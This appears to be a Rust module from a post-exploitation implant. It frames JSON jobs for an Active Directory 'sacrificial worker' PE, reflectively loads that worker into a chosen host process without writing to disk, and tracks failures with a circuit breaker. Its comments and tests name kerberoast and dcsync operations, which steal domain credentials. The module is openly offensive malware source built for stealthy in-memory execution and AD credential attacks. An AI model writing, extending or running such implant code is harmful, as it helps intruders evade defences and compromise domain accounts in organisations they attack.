//! L2 `ad` sacrificial worker — length-prefixed JSON jobs (KD-17).
//!
//! Stage0 never LoadLibrary/Manual-Map the ad PE. Domain protocol (LDAP/roast)
//! lives only in the worker binary; this module only frames, spawns, and collects.

use super::{
    err_result, supervisor,
    MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES, WORKER_TIMEOUTS,
};
use crate::types::CommandResult;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::sync::atomic::Ordering;

#[cfg(windows)]

/// Request body written after `u32le` length prefix (UTF-8 JSON).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdWorkerRequest {
    pub request_id: String,
    pub op: String,
    #[serde(default)]
    pub params: Value,
    #[serde(default = "default_deadline")]
    pub deadline_ms: u64,
}

fn default_deadline() -> u64 {
    30_000
}

/// Response body after `u32le` length prefix.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdWorkerResponse {
    #[serde(default)]
    pub request_id: String,
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub stdout: String,
    #[serde(default)]
    pub stderr: String,
    #[serde(default)]
    pub error_code: String,
}

/// Encode request as `u32le_len || json_utf8`.
pub fn encode_ad_request_frame(req: &AdWorkerRequest) -> Result<Vec<u8>, String> {
    let body = serde_json::to_vec(req).map_err(|e| e.to_string())?;
    if body.len() > MAX_PAYLOAD_BYTES {
        return Err("ad request too large".into());
    }
    let mut frame = Vec::with_capacity(4 + body.len());
    frame.extend_from_slice(&(body.len() as u32).to_le_bytes());
    frame.extend_from_slice(&body);
    Ok(frame)
}

/// Parse response frame `u32le_len || json_utf8`.
pub fn parse_ad_response_frame(data: &[u8]) -> Result<AdWorkerResponse, String> {
    if data.len() < 4 {
        return Err("ad response short header".into());
    }
    let len = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;
    if len > MAX_OUTPUT_BYTES * 2 {
        return Err("ad response too large".into());
    }
    if data.len() < 4 + len {
        return Err("ad response truncated".into());
    }
    serde_json::from_slice(&data[4..4 + len]).map_err(|e| format!("ad response json: {e}"))
}

/// Design-stable AD application outcomes that must **not** open the worker circuit.
/// Workgroup `ad_discover` → `not_domain_joined` is normal; counting it as failure
/// would block subsequent `ping` after a few discovers.
pub fn is_ad_soft_application_error(stderr: &str) -> bool {
    let s = stderr.trim();
    if s.is_empty() {
        return false;
    }
    // Operator staging gap — not worker instability
    if s.contains("module_required:") {
        return true;
    }
    // Design error_code strings (exact or prefixed)
    const CODES: &[&str] = &[
        "not_domain_joined",
        "unsupported_platform",
        "feature_disabled",
        "not_implemented",
        "dc_unreachable",
        "unknown_op",
        "invalid_params",
        "access_denied",
        "ldap_bind_failed",
        "ldap_sign_required",
    ];
    for c in CODES {
        if s == *c || s.starts_with(&format!("{c}:")) || s.starts_with(&format!("{c} ")) {
            return true;
        }
    }
    // Worker scaffold long form: "op 'kerberoast' not implemented in ad worker..."
    if s.contains("not implemented") {
        return true;
    }
    // feature_disabled long form
    if s.contains("feature_disabled") || s.contains("ad-dcsync feature") {
        return true;
    }
    false
}

/// True when the CommandResult should increment the AD fail_streak / open circuit.
pub fn ad_result_is_circuit_failure(result: &CommandResult) -> bool {
    if result.stderr.is_empty() {
        return false;
    }
    if is_ad_soft_application_error(&result.stderr) {
        return false;
    }
    // Hard failures: timeout, spawn/reader panic, payload limits, etc.
    true
}

/// Run one AD job in the registered sacrificial PE (op e.g. `ping`).
///
/// Missing PE → stderr contains `module_required:ad`.
pub fn execute_ad_job(op: &str, params: &Value, deadline_ms: u64) -> CommandResult {
    let body = serde_json::to_vec(&serde_json::json!({
        "request_id": format!("ad-{}", crate::utils::next_u32()),
        "op": op,
        "params": params,
        "deadline_ms": deadline_ms,
    }))
    .unwrap_or_default();
    if body.len() > MAX_PAYLOAD_BYTES {
        return err_result("payload too large");
    }

    {
        let mut g = match supervisor().inner.lock() {
            Ok(x) => x,
            Err(_) => return err_result("supervisor lock"),
        };
        if g.inflight >= supervisor().max_concurrent {
            return err_result("too many concurrent workers");
        }
        let streak = *g.fail_streak.get("ad").unwrap_or(&0);
        if streak >= supervisor().circuit_open_after {
            return err_result("circuit open: ad worker failures");
        }
        if !g.pe.contains_key("ad") {
            return err_result("module_required:ad (worker PE not staged)");
        }
        g.inflight += 1;
        g.status.insert(
            "ad".into(),
            super::WorkerStatus {
                state: super::WorkerState::Busy,
                last_error: None,
                updated: std::time::Instant::now(),
            },
        );
    }

    let result = run_ad_worker(&body, deadline_ms);

    if let Ok(mut g) = supervisor().inner.lock() {
        g.inflight = g.inflight.saturating_sub(1);
        let fail = ad_result_is_circuit_failure(&result);
        let streak = g.fail_streak.entry("ad".into()).or_insert(0);
        if fail {
            *streak = streak.saturating_add(1);
            if result.stderr.contains("timeout") {
                WORKER_TIMEOUTS.fetch_add(1, Ordering::Relaxed);
            }
        } else {
            // Soft app errors and success reset the streak so normal discover on
            // workgroup hosts never trips the circuit.
            *streak = 0;
        }
        let open = *streak >= supervisor().circuit_open_after;
        g.status.insert(
            "ad".into(),
            super::WorkerStatus {
                state: if open {
                    super::WorkerState::Failed
                } else if result.stderr.contains("timeout") {
                    super::WorkerState::Timeout
                } else {
                    super::WorkerState::Ready
                },
                last_error: if fail {
                    Some(result.stderr.clone())
                } else {
                    None
                },
                updated: std::time::Instant::now(),
            },
        );
    }
    result
}

#[cfg(windows)]
fn run_ad_worker(json_body: &[u8], deadline_ms: u64) -> CommandResult {
    let pe = match supervisor().get_pe("ad") {
        Some(p) if p.len() > 64 && p[0] == b'M' && p[1] == b'Z' => p,
        _ => return err_result("module_required:ad (worker PE not staged)"),
    };

    // Rebuild framed request: body may already be full JSON without length prefix.
    let mut frame = Vec::with_capacity(4 + json_body.len());
    frame.extend_from_slice(&(json_body.len() as u32).to_le_bytes());
    frame.extend_from_slice(json_body);

    // reflective load into sacrificial host (no disk write)
    let host_exe = crate::module_supervisor::pick_host_for_worker();
    match crate::img_load::spawn_reflective_worker(
        &pe,
        &frame,
        deadline_ms,
        &format!("\"{host_exe}\""),
    ) {
        Ok((out, _err)) => {
            // AD worker protocol: `u32le_len || JSON_utf8`. `out` carries the frame.
            match parse_ad_response_frame(&out) {
                Ok(resp) => map_ad_worker_response(resp),
                Err(e) => err_result(e),
            }
        }
        Err(e) => err_result(format!("ad worker: {e}")),
    }
}

/// Map AD worker JSON response → CommandResult.
/// `status != "ok"` is always an error path: promote `error_code` into stderr when
/// stderr is empty so soft codes (feature_disabled / not_domain_joined) never look
/// like success.
pub fn map_ad_worker_response(resp: AdWorkerResponse) -> CommandResult {
    let ok = resp.status.eq_ignore_ascii_case("ok");
    if ok {
        return CommandResult {
            stdout: if resp.stdout.is_empty() {
                resp.status
            } else {
                resp.stdout
            },
            stderr: resp.stderr,
            path: None,
            req_id: None,
        };
    }
    let stderr = if !resp.stderr.is_empty() {
        resp.stderr
    } else if !resp.error_code.is_empty() {
        resp.error_code
    } else {
        resp.status
    };
    CommandResult {
        stdout: resp.stdout,
        stderr,
        path: None,
        req_id: None,
    }
}

#[cfg(not(windows))]
fn run_ad_worker(_json_body: &[u8], _deadline_ms: u64) -> CommandResult {
    err_result("unsupported_platform")
}

#[cfg(test)]
mod soft_error_tests {
    use super::*;

    fn cr(stderr: &str, stdout: &str) -> CommandResult {
        CommandResult {
            stdout: stdout.into(),
            stderr: stderr.into(),
            path: None,
            req_id: None,
        }
    }

    #[test]
    fn map_error_status_promotes_error_code_when_stderr_empty() {
        let r = map_ad_worker_response(AdWorkerResponse {
            request_id: "x".into(),
            status: "error".into(),
            stdout: String::new(),
            stderr: String::new(),
            error_code: "feature_disabled".into(),
        });
        assert_eq!(r.stderr, "feature_disabled");
        assert!(ad_result_is_circuit_failure(&r) == false || is_ad_soft_application_error(&r.stderr));
        assert!(!r.stderr.is_empty());

        let r2 = map_ad_worker_response(AdWorkerResponse {
            request_id: "y".into(),
            status: "error".into(),
            stdout: String::new(),
            stderr: String::new(),
            error_code: "not_domain_joined".into(),
        });
        assert_eq!(r2.stderr, "not_domain_joined");

        let ok = map_ad_worker_response(AdWorkerResponse {
            request_id: "z".into(),
            status: "ok".into(),
            stdout: "pong".into(),
            stderr: String::new(),
            error_code: String::new(),
        });
        assert_eq!(ok.stdout, "pong");
        assert!(ok.stderr.is_empty());
    }

    #[test]
    fn soft_codes_do_not_trip_circuit() {
        for code in [
            "not_domain_joined",
            "unsupported_platform",
            "feature_disabled",
            "not_implemented",
            "dc_unreachable",
            "module_required:ad (worker PE not staged)",
            "op 'kerberoast' not implemented in ad worker (B0/B1 partial; see AD_MODULE_DESIGN)",
            "dcsync requires ad-dcsync feature (default off)",
        ] {
            assert!(
                is_ad_soft_application_error(code),
                "expected soft: {code}"
            );
            assert!(
                !ad_result_is_circuit_failure(&cr(code, "")),
                "circuit must not open for soft: {code}"
            );
        }
        // Success
        assert!(!ad_result_is_circuit_failure(&cr("", "pong")));
        // Hard failures still trip
        for hard in [
            "worker timeout",
            "payload too large",
            "worker reader panicked",
            "supervisor lock",
        ] {
            assert!(
                ad_result_is_circuit_failure(&cr(hard, "")),
                "expected hard circuit failure: {hard}"
            );
        }
    }

    #[test]
    fn repeated_soft_errors_do_not_open_ad_circuit() {
        // Simulate recording soft discover results without going through PE.
        if let Ok(mut g) = supervisor().inner.lock() {
            g.fail_streak.insert("ad".into(), 0);
        }
        for _ in 0..10 {
            let soft = cr("not_domain_joined", "");
            if let Ok(mut g) = supervisor().inner.lock() {
                let fail = ad_result_is_circuit_failure(&soft);
                let streak = g.fail_streak.entry("ad".into()).or_insert(0);
                if fail {
                    *streak = streak.saturating_add(1);
                } else {
                    *streak = 0;
                }
            }
        }
        let streak = supervisor()
            .inner
            .lock()
            .map(|g| *g.fail_streak.get("ad").unwrap_or(&0))
            .unwrap_or(99);
        assert_eq!(streak, 0, "soft discovers must reset streak, got {streak}");
        assert!(streak < supervisor().circuit_open_after);
    }
}
